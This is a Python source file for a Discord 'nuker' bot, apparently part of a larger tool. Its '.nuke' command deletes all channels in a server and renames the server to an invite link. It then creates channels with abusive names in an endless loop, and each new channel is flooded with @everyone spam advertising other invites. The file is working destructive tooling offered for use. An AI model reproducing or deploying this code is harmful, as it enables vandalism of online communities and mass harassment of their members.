def loadBot():
    import discord
    from discord.ext import commands
    from colorama import init, Fore, Style
    import os
    from plugins.getNbLogo import printLogo

    os.system('cls')

    printLogo()

    botToken = input('\033[38;5;129m Application Token: ' + Style.RESET_ALL) 

    client = commands.Bot(command_prefix = '.',         
                      intents=discord.Intents.all(), case_insensitive=True)
    
    @client.event
    async def on_ready():
        os.system('cls')
        printLogo()
        print(f'{client.user} logged in!')
        print('Close and re-open the window to carry on with the tool. This will shutdown the bot so do it when ready.')
    
    @client.command(help="Nukes the server")
    async def nuke(ctx):
            
        await ctx.message.delete()
        print(f'[+] {ctx.author} (ctx.author.id) has nuked a server in {ctx.guild}')
        await ctx.guild.edit(name='discord.gg/7y73tN9cq8')

        author_username = ctx.author.name
        
        for channels in ctx.guild.channels:
            try:
                await channels.delete()
            except Exception as e:
                pass
                
        while True:
            try:
                await ctx.guild.create_text_channel('get-fucked')
            except Exception as e:
                print(f"[+] Error: {e}")
                
    @client.event
    async def on_guild_channel_create(channel):
        while True:
            try:
                await channel.send(f'@everyone @here https://discord.gg/pNsPNr5pjz NUKED')
                await channel.send(f'@everyone @here https://discord.gg/pNsPNr5pjz NUKED')
                await channel.send(f'@everyone @here https://discord.gg/pNsPNr5pjz NUKED')
                await channel.send(f'@everyone @here https://discord.gg/pNsPNr5pjz NUKED')
            except Exception as e:
                print(f"[+] Error: {e}")

    try:
        client.run(botToken)
    except:
        print(Style.BRIGHT + Fore.RED + "[X] An error happened.")
        os.system('pause')